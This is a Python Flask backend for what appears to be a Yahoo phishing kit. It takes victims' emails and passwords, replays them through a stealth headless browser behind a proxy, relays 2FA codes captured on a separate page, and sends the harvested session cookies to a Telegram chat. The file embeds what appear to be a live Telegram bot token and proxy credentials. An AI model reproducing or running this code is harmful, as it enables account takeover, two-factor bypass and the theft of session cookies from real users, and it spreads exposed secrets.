from flask import Flask, request, jsonify
from flask_cors import CORS
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import json
import random
import telebot
from threading import Thread
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = "8664946712:AAHho-AsU7hRuBs43J-7k-kZ5gmhUz6-6b8"
CHAT_ID = -1003709189605

current_driver = None
current_email = None

PROXIES = [
    {"host": "gate.decodo.com", "port": "7000", "user": "sph7g5g4xx", "pass": "zEfr90tw8nZh5uHWr_"},
]

bot = telebot.TeleBot(BOT_TOKEN)

@app.route('/start_login', methods=['POST'])
def start_login():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    if not email or not password:
        return jsonify({"error": "Missing credentials"}), 400

    bot.send_message(CHAT_ID, f"📧 New Login Request\nEmail: {email}")
    Thread(target=selenium_login, args=(email, password)).start()
    return jsonify({"success": True})

@app.route('/submit_2fa', methods=['POST'])
def submit_2fa():
    global current_driver, current_email
    data = request.json
    code = data.get('code')

    if not current_driver:
        return jsonify({"success": False, "error": "No active session"})

    try:
        code_input = WebDriverWait(current_driver, 15).until(
            EC.presence_of_element_located((By.ID, "codeInput"))
        )
        code_input.clear()
        code_input.send_keys(code)

        verify_button = current_driver.find_element(By.TAG_NAME, "button")
        verify_button.click()

        bot.send_message(CHAT_ID, f"✅ 2FA Code Submitted: {code}")

        time.sleep(10)
        current_driver.get("https://mail.yahoo.com/")
        time.sleep(12)

        cookies = current_driver.get_cookies()
        total = len(cookies)

        filename = f"yahoo_cookies_{current_email.split('@')[0]}.json"
        with open(filename, "w") as f:
            json.dump({
                "email": current_email,
                "status": "success_2fa",
                "total_cookies": total,
                "full_cookies": {c['name']: c['value'] for c in cookies}
            }, f, indent=2)

        with open(filename, "rb") as f:
            bot.send_document(CHAT_ID, f, caption=f"🎉 Login Success with 2FA!\nEmail: {current_email}\nTotal Cookies: {total}")

        return jsonify({"success": True})

    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

def selenium_login(email, password):
    global current_driver, current_email
    driver = None
    try:
        current_email = email
        bot.send_message(CHAT_ID, f"🔄 Starting login for {email}")

        options = uc.ChromeOptions()
        options.headless = True
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--window-size=1920,1080")
        options.binary_location = "/usr/bin/google-chrome"

        driver = uc.Chrome(options=options, use_subprocess=True)
        current_driver = driver

        driver.get("https://login.yahoo.com/")
        time.sleep(8)

        wait = WebDriverWait(driver, 30)

        bot.send_message(CHAT_ID, "📝 Entering Username...")
        username = wait.until(EC.element_to_be_clickable((By.NAME, "username")))
        username.send_keys(email)
        driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()
        time.sleep(6)

        bot.send_message(CHAT_ID, "🔑 Entering Password...")
        password_field = wait.until(EC.element_to_be_clickable((By.NAME, "password")))
        password_field.send_keys(password)
        driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()

        bot.send_message(CHAT_ID, "⏳ Checking result...")
        time.sleep(15)

        if any(x in driver.current_url.lower() for x in ["2fa", "verification", "challenge", "otp", "code"]):
            bot.send_message(CHAT_ID, "🔐 2FA Detected!\nGo to your 2fa.html page and enter the code.")
            return

        # No 2FA
        bot.send_message(CHAT_ID, "✅ No 2FA. Proceeding...")
        driver.get("https://mail.yahoo.com/")
        time.sleep(12)

        cookies = driver.get_cookies()
        total = len(cookies)

        filename = f"yahoo_cookies_{email.split('@')[0]}.json"
        with open(filename, "w") as f:
            json.dump({
                "email": email,
                "total_cookies": total,
                "full_cookies": {c['name']: c['value'] for c in cookies}
            }, f, indent=2)

        with open(filename, "rb") as f:
            bot.send_document(CHAT_ID, f, caption=f"🎉 Login Successful!\nEmail: {email}\nTotal Cookies: {total}")

    except Exception as e:
        bot.send_message(CHAT_ID, f"❌ Error: {str(e)[:200]}")
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

if __name__ == '__main__':
    print("🚀 Backend Started")
    app.run(host='0.0.0.0', port=5001, debug=False)
